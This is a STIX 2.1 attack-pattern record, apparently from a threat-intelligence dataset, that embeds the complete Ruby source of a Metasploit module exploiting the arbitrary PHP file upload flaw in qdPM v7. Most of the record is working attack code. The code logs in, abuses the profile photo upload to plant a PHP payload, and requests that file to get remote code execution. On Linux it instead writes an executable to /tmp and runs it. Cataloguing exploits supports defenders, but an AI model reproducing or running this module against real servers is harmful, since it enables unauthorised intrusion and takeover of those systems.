{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d422645-8462-4c88-a6cb-729390b24ba2",
    "created": "2024-08-14T17:11:32.083097Z",
    "modified": "2024-08-14T17:11:32.083101Z",
    "name": "\"qdPM v7 Arbitrary PHP File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability found in qdPM - a web-based project management software. The user profile's photo upload feature can be abused to upload any arbitrary file onto the victim server machine, which allows remote code execution. Please note in order to use this module, you must have a valid credential to sign in.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/qdpm_upload_exec.rb",
            "external_id": "qdpm_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"qdPM v7 Arbitrary PHP File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in qdPM - a web-based project management\n        software. The user profile's photo upload feature can be abused to upload any\n        arbitrary file onto the victim server machine, which allows remote code execution.\n        Please note in order to use this module, you must have a valid credential to sign\n        in.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'loneferret', #Discovery, PoC\n          'sinn3r'      #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '82978'],\n          ['EDB', '19154']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => %w{ linux php },\n      'Targets'        =>\n        [\n          [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n          [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-06-14',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base directory to sflog!', '/qdPM/']),\n        OptString.new('USERNAME',  [true, 'The username to login with']),\n        OptString.new('PASSWORD',  [true, 'The password to login with'])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    res = send_request_raw({'uri'=>normalize_uri(base, \"/index.php\")})\n    if res and res.body =~ /<div id\\=\\\"footer\\\"\\>.+qdPM ([\\d])\\.([\\d]).+\\<\\/div\\>/m\n      major, minor = $1, $2\n      return Exploit::CheckCode::Appears if (major+minor).to_i <= 70\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def get_write_exec_payload(fname, data)\n    p = Rex::Text.encode_base64(generate_payload_exe)\n    php = %Q|\n    <?php\n    $f = fopen(\"#{fname}\", \"wb\");\n    fwrite($f, base64_decode(\"#{p}\"));\n    fclose($f);\n    exec(\"chmod 777 #{fname}\");\n    exec(\"#{fname}\");\n    ?>\n    |\n    php = php.gsub(/^ {4}/, '').gsub(/\\n/, ' ')\n    return php\n  end\n\n  def on_new_session(cli)\n    if cli.type == \"meterpreter\"\n      cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n    end\n\n    @clean_files.each do |f|\n      print_warning(\"Removing: #{f}\")\n      begin\n        if cli.type == 'meterpreter'\n          cli.fs.file.rm(f)\n        else\n          cli.shell_command_token(\"rm #{f}\")\n        end\n      rescue ::Exception => e\n        print_error(\"Unable to remove #{f}: #{e.message}\")\n      end\n    end\n  end\n\n  def login(base, username, password)\n    # Login\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(\"#{base}/index.php/home/login\"),\n      'vars_post' => {\n        'login[email]'    => username,\n        'login[password]' => password,\n        'http_referer'    => ''\n      },\n      # This needs to be set, otherwise we get two cookies... I don't need two cookies.\n      'cookie'     => \"qdpm=#{Rex::Text.rand_text_alpha(27)}\",\n      'headers'   => {\n        'Origin' => \"http://#{rhost}\",\n        'Referer' => \"http://#{rhost}/#{base}/index.php/home/login\"\n      }\n    })\n\n    cookie = (res and res.get_cookies =~ /qdpm\\=.+\\;/) ? res.get_cookies : ''\n    return {} if cookie.empty?\n    cookie = cookie.to_s.scan(/(qdpm\\=\\w+)\\;/).flatten[0]\n\n    # Get user data\n    vprint_status(\"Enumerating user data\")\n    res = send_request_raw({\n      'uri' => \"#{base}/index.php/home/myAccount\",\n      'cookie' => cookie\n    })\n\n    return {} if not res\n    if res.code == 404\n      print_error(\"#{username} does not actually have a 'myAccount' page\")\n      return {}\n    end\n\n    b = res.body\n\n    user_id = b.scan(/\\<input type\\=\\\"hidden\\\" name\\=\\\"users\\[id\\]\\\" value\\=\\\"(.+)\\\" id\\=\\\"users\\_id\\\" \\/\\>/).flatten[0] || ''\n    group_id = b.scan(/\\<input type\\=\\\"hidden\\\" name\\=\\\"users\\[users\\_group\\_id\\]\\\" value\\=\\\"(.+)\\\" id\\=\\\"users\\_users\\_group\\_id\\\" \\/>/).flatten[0] || ''\n    user_active = b.scan(/\\<input type\\=\\\"hidden\\\" name\\=\\\"users\\[active\\]\\\" value\\=\\\"(.+)\\\" id\\=\\\"users\\_active\\\" \\/\\>/).flatten[0] || ''\n\n    opts = {\n      'cookie'     => cookie,\n      'user_id'     => user_id,\n      'group_id'    => group_id,\n      'user_active' => user_active\n    }\n\n    return opts\n  end\n\n  def upload_php(base, opts)\n    fname       = opts['filename']\n    php_payload = opts['data']\n    user_id     = opts['user_id']\n    group_id    = opts['group_id']\n    user_active = opts['user_active']\n    username    = opts['username']\n    email       = opts['email']\n    cookie      = opts['cookie']\n\n    data = Rex::MIME::Message.new\n    data.add_part('UsersAccountForm', nil, nil, 'form-data; name=\"formName\"')\n    data.add_part('put', nil, nil, 'form-data; name=\"sf_method\"')\n    data.add_part(user_id, nil, nil, 'form-data; name=\"users[id]\"')\n    data.add_part(group_id, nil, nil, 'form-data; name=\"users[users_group_id]\"')\n    data.add_part(user_active, nil, nil, 'form-data; name=\"users[active]\"')\n    data.add_part('', nil, nil, 'form-data; name=\"users[skin]\"')\n    data.add_part(username, nil, nil, 'form-data; name=\"users[name]\"')\n    data.add_part(php_payload, nil, nil, \"form-data; name=\\\"users[photo]\\\"; filename=\\\"#{fname}\\\"\")\n    data.add_part('', nil, nil, 'form-data; name=\"preview_photo\"')\n    data.add_part(email, nil, nil, 'form-data; name=\"users[email]\"')\n    data.add_part('en_US', nil, nil, 'form-data; name=\"users[culture]\"')\n    data.add_part('', nil, nil, 'form-data; name=\"new_password\"')\n\n    post_data = data.to_s\n\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(\"#{base}/index.php/home/myAccount\"),\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => post_data,\n      'cookie'  => cookie,\n      'headers' => {\n        'Origin' => \"http://#{rhost}\",\n        'Referer' => \"http://#{rhost}#{base}/index.php/home/myAccount\"\n      }\n    })\n\n    return (res and res.headers['Location'] =~ /home\\/myAccount$/) ? true : false\n  end\n\n  def exec_php(base, opts)\n    cookie = opts['cookie']\n\n    # When we upload a file, it will be renamed. The 'myAccount' page has that info.\n    res = send_request_cgi({\n      'uri'    => normalize_uri(\"#{base}/index.php/home/myAccount\"),\n      'cookie' => cookie\n    })\n\n    if not res\n      print_error(\"Unable to request the file\")\n      return\n    end\n\n    fname = res.body.scan(/\\<input type\\=\\\"hidden\\\" name\\=\\\"preview\\_photo\\\" id\\=\\\"preview\\_photo\\\" value\\=\\\"(\\d+\\-\\w+\\.php)\\\" \\/\\>/).flatten[0] || ''\n    if fname.empty?\n      print_error(\"Unable to extract the real filename\")\n      return\n    end\n\n    # Now that we have the filename, request it\n    print_status(\"Uploaded file was renmaed as '#{fname}'\")\n    send_request_raw({'uri'=>\"#{base}/uploads/users/#{fname}\"})\n    handler\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n    print_status(\"Attempt to login with '#{user}:#{pass}'\")\n    opts = login(base, user, pass)\n    if opts.empty?\n      print_error(\"Login unsuccessful\")\n      return\n    end\n\n    php_fname = \"#{Rex::Text.rand_text_alpha(5)}.php\"\n    @clean_files = [php_fname]\n\n    case target['Platform']\n    when 'php'\n      p = \"<?php #{payload.encoded} ?>\"\n    when 'linux'\n      bin_name = \"#{Rex::Text.rand_text_alpha(5)}.bin\"\n      @clean_files << bin_name\n      bin = generate_payload_exe\n      p = get_write_exec_payload(\"/tmp/#{bin_name}\", bin)\n    end\n\n    print_status(\"Uploading PHP payload (#{p.length.to_s} bytes)...\")\n    opts = opts.merge({\n      'username' => user.scan(/^(.+)\\@.+/).flatten[0] || '',\n      'email'    => user,\n      'filename' => php_fname,\n      'data'     => p\n    })\n    uploader = upload_php(base, opts)\n    if not uploader\n      print_error(\"Unable to upload\")\n      return\n    end\n\n    print_status(\"Executing '#{php_fname}'\")\n    exec_php(base, opts)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-14",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}